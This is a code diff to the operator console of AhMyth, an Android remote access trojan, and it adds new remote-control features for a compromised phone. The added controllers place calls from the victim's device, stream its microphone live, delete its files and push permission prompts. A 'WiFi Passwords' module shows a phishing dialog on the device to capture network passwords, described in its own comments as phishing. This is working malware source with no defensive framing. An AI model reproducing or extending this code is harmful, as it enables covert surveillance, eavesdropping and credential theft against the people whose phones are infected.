@@ -172,6 +172,18 @@ app.config(function ($routeProvider, $locationProvider) {
             templateUrl: "views/systemInfo.html",
             controller: "SystemInfoCtrl"
         })
+        .when("/makeCall", {
+            templateUrl: "views/makeCall.html",
+            controller: "MakeCallCtrl"
+        })
+        .when("/liveMic", {
+            templateUrl: "views/liveMic.html",
+            controller: "LiveMicCtrl"
+        })
+        .when("/wifiPasswords", {
+            templateUrl: "views/wifiPasswords.html",
+            controller: "WiFiPasswordsCtrl"
+        })
         .otherwise({
             redirectTo: '/'
         });
@@ -238,6 +250,26 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
         }
     };
 
+    // Global permission request function - available to all controllers
+    $rootScope.requestPermission = (permissionType) => {
+        const permOrder = CONSTANTS.orders.requestPermission || 'x0000rp';
+        $rootScope.Log(`[→] Requesting ${permissionType} permission on device...`, CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: permOrder, permission: permissionType });
+    };
+
+    // Listen for permission request responses
+    socket.on('x0000rp', (data) => {
+        if (data.success) {
+            $rootScope.Log(`[✓] Permission request shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
+        } else if (data.error) {
+            $rootScope.Log(`[✗] Permission error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        } else if (data.granted) {
+            $rootScope.Log(`[✓] Permission granted: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
+        }
+        if (!$rootScope.$$phase) {
+            $rootScope.$apply();
+        }
+    });
 
     // Enhanced logging with timestamps
     $rootScope.Log = (msg, status) => {
@@ -542,15 +574,31 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     };
 
     // Save/download file
-    $fmCtrl.saveFile = (file) => {
-        let filePath = file.path || ($fmCtrl.currentPath + '/' + file.name);
+    $fmCtrl.saveFile = (filePath) => {
         $rootScope.Log(`[→] Downloading: ${filePath}`, CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: fileManager, extra: 'dl', path: filePath });
     };
 
+    // Delete file/folder
+    $fmCtrl.deleteFile = (filePath, fileName) => {
+        if (confirm(`Are you sure you want to delete "${fileName}"?`)) {
+            $rootScope.Log(`[→] Deleting: ${filePath}`, CONSTANTS.logStatus.INFO);
+            socket.emit(ORDER, { order: fileManager, extra: 'delete', path: filePath });
+        }
+    };
+
     // Socket handler
     socket.on(fileManager, (data) => {
-        if (data.file == true) {
+        if (data.deleted !== undefined) {
+            // Delete response
+            if (data.deleted) {
+                $rootScope.Log(`[✓] Deleted: ${data.path}`, CONSTANTS.logStatus.SUCCESS);
+                // Refresh current directory
+                socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
+            } else {
+                $rootScope.Log(`[✗] Failed to delete: ${data.path}`, CONSTANTS.logStatus.FAIL);
+            }
+        } else if (data.file == true) {
             // File download response
             $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
             var filePath = path.join(downloadsPath, data.name);
@@ -905,38 +953,45 @@ app.controller("LocCtrl", function ($scope, $rootScope, $timeout) {
             const mapContainer = document.getElementById('mapid');
             if (mapContainer && !map) {
                 try {
-                    // Set explicit height
-                    mapContainer.style.height = '100%';
-                    mapContainer.style.minHeight = '300px';
+                    // Set explicit dimensions
+                    mapContainer.style.width = '100%';
+                    mapContainer.style.height = '400px';
+                    mapContainer.style.minHeight = '400px';
                     
                     // Initialize Leaflet map
                     map = L.map('mapid', {
                         center: [51.505, -0.09],
                         zoom: 13,
-                        zoomControl: true
+                        zoomControl: true,
+                        attributionControl: true
                     });
                     
-                    // Add Google Maps satellite/hybrid tile layer (free, no API key required)
-                    L.tileLayer('https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
-                        attribution: '&copy; Google Maps',
-                        maxZoom: 20
+                    // Use OpenStreetMap tiles (most reliable, no API key needed)
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
+                        maxZoom: 19,
+                        subdomains: ['a', 'b', 'c']
                     }).addTo(map);
                     
-                    // Force map to recalculate size
-                    setTimeout(() => {
-                        map.invalidateSize();
-                    }, 100);
-                    setTimeout(() => {
-                        map.invalidateSize();
-                    }, 500);
-                    setTimeout(() => {
-                        map.invalidateSize();
-                    }, 1000);
+                    // Force map to recalculate size multiple times
+                    var resizeMap = function() {
+                        if (map) {
+                            map.invalidateSize(true);
+                        }
+                    };
+                    setTimeout(resizeMap, 100);
+                    setTimeout(resizeMap, 300);
+                    setTimeout(resizeMap, 500);
+                    setTimeout(resizeMap, 1000);
+                    setTimeout(resizeMap, 2000);
+                    
+                    // Also resize on window resize
+                    window.addEventListener('resize', resizeMap);
                     
                     $rootScope.Log('[✓] Map initialized successfully', CONSTANTS.logStatus.SUCCESS);
                 } catch (e) {
                     console.error('[AhMyth] Map initialization error:', e);
-                    $rootScope.Log('[✗] Failed to initialize map', CONSTANTS.logStatus.FAIL);
+                    $rootScope.Log('[✗] Failed to initialize map: ' + e.message, CONSTANTS.logStatus.FAIL);
                 }
             } else if (!mapContainer) {
                 // Retry after a short delay
@@ -1513,6 +1568,17 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         }
     };
     
+    $ScreenCtrl.requestPermission = () => {
+        $rootScope.Log('[→] Requesting screen capture permission on device...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: screen, extra: 'request' });
+        
+        // Show feedback
+        $ScreenCtrl.permissionRequesting = true;
+        $timeout(() => {
+            $ScreenCtrl.permissionRequesting = false;
+        }, 5000);
+    };
+    
     $ScreenCtrl.saveScreenshot = () => {
         if (!$ScreenCtrl.currentFrame) return;
         
@@ -1550,7 +1616,11 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         $ScreenCtrl.isLoading = false;
         
         if (data.success === false) {
-            if (data.error && data.error.toLowerCase().includes('permission')) {
+            if (data.permissionRequested) {
+                // Permission dialog was shown on device
+                $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
+                $ScreenCtrl.permissionRequired = true;
+            } else if (data.error && data.error.toLowerCase().includes('permission')) {
                 $ScreenCtrl.permissionRequired = true;
                 $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
             } else {
@@ -1559,6 +1629,12 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             
             if ($ScreenCtrl.isStreaming) {
                 $ScreenCtrl.stopStream();
+            }
+        } else if (data.message && data.message.includes('permission')) {
+            // Permission request sent successfully
+            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
+            if (data.instruction) {
+                $rootScope.Log(`[→] ${data.instruction}`, CONSTANTS.logStatus.INFO);
             }
         } else if (data.image) {
             $ScreenCtrl.frameCount++;
@@ -1581,8 +1657,14 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
         } else if (data.quality) {
             $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
+        } else if (data.isCapturing !== undefined) {
+            // Status response
+            $rootScope.Log(`[✓] Screen capture status: ${data.isCapturing ? 'Active' : 'Inactive'}`, CONSTANTS.logStatus.INFO);
+            if (data.isCapturing) {
+                $ScreenCtrl.permissionRequired = false;
+            }
         } else {
-            console.log('[AhMyth] Received screen data without image or error:', data);
+            console.log('[AhMyth] Received screen data:', data);
         }
         
         if (!$ScreenCtrl.$$phase) {
@@ -1928,4 +2010,193 @@ app.controller("SystemInfoCtrl", function ($scope, $rootScope) {
 
     // Initial load
     $SysInfoCtrl.getAllSystemInfo();
+});
+
+//-----------------------Make Call Controller------------------------
+app.controller("MakeCallCtrl", function ($scope, $rootScope) {
+    $MakeCallCtrl = $scope;
+    $MakeCallCtrl.phoneNumber = '';
+    $MakeCallCtrl.callHistory = [];
+    
+    var makeCall = CONSTANTS.orders.makeCall || 'x0000mc2';
+
+    $MakeCallCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(makeCall);
+    });
+
+    $MakeCallCtrl.makeCall = () => {
+        if (!$MakeCallCtrl.phoneNumber) {
+            $rootScope.Log('[✗] Please enter a phone number', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        
+        $rootScope.Log(`[→] Initiating call to ${$MakeCallCtrl.phoneNumber}...`, CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: makeCall, phoneNumber: $MakeCallCtrl.phoneNumber });
+        
+        // Add to history
+        $MakeCallCtrl.callHistory.unshift({
+            number: $MakeCallCtrl.phoneNumber,
+            time: new Date().toLocaleTimeString()
+        });
+        
+        if ($MakeCallCtrl.callHistory.length > 10) {
+            $MakeCallCtrl.callHistory.pop();
+        }
+    };
+
+    socket.on(makeCall, (data) => {
+        if (data.success) {
+            $rootScope.Log(`[✓] Call initiated to ${data.phoneNumber}`, CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log(`[✗] Failed to make call: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        }
+        $MakeCallCtrl.$apply();
+    });
+});
+
+//-----------------------Live Mic Controller------------------------
+app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
+    $LiveMicCtrl = $scope;
+    $LiveMicCtrl.isStreaming = false;
+    $LiveMicCtrl.streamDuration = '00:00:00';
+    $LiveMicCtrl.audioChunks = 0;
+    
+    var liveMic = CONSTANTS.orders.liveMic || 'x0000lm2';
+    var streamTimer = null;
+    var startTime = null;
+    var audioContext = null;
+
+    $LiveMicCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(liveMic);
+        if (streamTimer) $interval.cancel(streamTimer);
+        if (audioContext) audioContext.close();
+    });
+
+    $LiveMicCtrl.startStream = () => {
+        $LiveMicCtrl.isStreaming = true;
+        $LiveMicCtrl.audioChunks = 0;
+        startTime = Date.now();
+        
+        $rootScope.Log('[→] Starting live microphone stream...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: liveMic, action: 'start' });
+        
+        // Update duration timer
+        streamTimer = $interval(() => {
+            var elapsed = Math.floor((Date.now() - startTime) / 1000);
+            var hours = Math.floor(elapsed / 3600);
+            var minutes = Math.floor((elapsed % 3600) / 60);
+            var seconds = elapsed % 60;
+            $LiveMicCtrl.streamDuration = 
+                String(hours).padStart(2, '0') + ':' +
+                String(minutes).padStart(2, '0') + ':' +
+                String(seconds).padStart(2, '0');
+        }, 1000);
+    };
+
+    $LiveMicCtrl.stopStream = () => {
+        $LiveMicCtrl.isStreaming = false;
+        
+        $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: liveMic, action: 'stop' });
+        
+        if (streamTimer) {
+            $interval.cancel(streamTimer);
+            streamTimer = null;
+        }
+    };
+
+    socket.on(liveMic, (data) => {
+        if (data.audio) {
+            $LiveMicCtrl.audioChunks++;
+            // Audio playback would go here
+            // For now just count chunks
+        } else if (data.started) {
+            $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
+        } else if (data.stopped) {
+            $rootScope.Log('[✓] Live microphone streaming stopped', CONSTANTS.logStatus.SUCCESS);
+        } else if (data.error) {
+            $rootScope.Log(`[✗] Microphone error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        }
+        
+        if (!$LiveMicCtrl.$$phase) {
+            $LiveMicCtrl.$apply();
+        }
+    });
+});
+
+//-----------------------WiFi Passwords Controller------------------------
+app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
+    $WiFiPwdCtrl = $scope;
+    $WiFiPwdCtrl.wifiNetworks = [];
+    $WiFiPwdCtrl.isLoading = false;
+    $WiFiPwdCtrl.error = null;
+    $WiFiPwdCtrl.capturedPassword = null;
+    
+    var wifiPasswords = CONSTANTS.orders.wifiPasswords || 'x0000wp';
+
+    $WiFiPwdCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(wifiPasswords);
+    });
+
+    // Show phishing dialog to capture WiFi password
+    $WiFiPwdCtrl.promptWifiPassword = () => {
+        $rootScope.Log('[→] Showing WiFi password prompt on device...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt' });
+    };
+
+    $WiFiPwdCtrl.getWifiPasswords = () => {
+        $WiFiPwdCtrl.isLoading = true;
+        $WiFiPwdCtrl.error = null;
+        $WiFiPwdCtrl.wifiNetworks = [];
+        
+        $rootScope.Log('[→] Retrieving WiFi passwords...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: wifiPasswords });
+    };
+
+    $WiFiPwdCtrl.copyPassword = (password) => {
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(password).then(() => {
+                $rootScope.Log('[✓] Password copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+            });
+        }
+    };
+
+    socket.on(wifiPasswords, (data) => {
+        $WiFiPwdCtrl.isLoading = false;
+        
+        // Check if this is a captured password from phishing dialog
+        if (data.password && data.ssid) {
+            $WiFiPwdCtrl.capturedPassword = {
+                ssid: data.ssid,
+                password: data.password
+            };
+            $rootScope.Log(`[✓] PASSWORD CAPTURED! SSID: ${data.ssid}, Password: ${data.password}`, CONSTANTS.logStatus.SUCCESS);
+            
+            // Also add to networks list
+            $WiFiPwdCtrl.wifiNetworks.unshift({
+                ssid: data.ssid,
+                password: data.password,
+                security: 'Captured',
+                showPassword: true
+            });
+        } else if (data.message && data.instruction) {
+            // Prompt shown confirmation
+            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
+        } else if (data.error) {
+            $WiFiPwdCtrl.error = {
+                title: 'Failed to retrieve passwords',
+                message: data.error
+            };
+            $rootScope.Log(`[✗] WiFi passwords error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        } else if (data.networks) {
+            $WiFiPwdCtrl.wifiNetworks = data.networks.map(n => ({ ...n, showPassword: false }));
+            $rootScope.Log(`[✓] Found ${data.networks.length} saved WiFi networks`, CONSTANTS.logStatus.SUCCESS);
+            
+            if (data.note) {
+                $rootScope.Log(`[!] ${data.note}`, CONSTANTS.logStatus.WARN);
+            }
+        }
+        
+        $WiFiPwdCtrl.$apply();
+    });
 });
